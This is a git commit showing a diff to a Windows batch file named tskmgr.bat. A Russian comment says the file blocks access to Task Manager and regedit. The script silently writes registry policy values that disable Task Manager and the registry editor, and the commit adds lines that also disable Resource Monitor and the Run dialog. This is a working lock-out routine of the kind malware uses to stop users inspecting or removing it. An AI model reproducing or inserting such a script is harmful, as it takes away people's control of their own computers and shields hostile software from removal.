8441401188417aeabef9ad16e151e1bf64a621c7
Rlz-vz <xc1rze2@gmail.com>
2025-02-04 19:37:42 +0400

    Add files via upload

--- tskmgr.bat
+++ tskmgr.bat
@@ -1,5 +1,7 @@
 :: Запрет доступа к диспетчеру задач и regedit
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableResmon /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
 
 exit /b
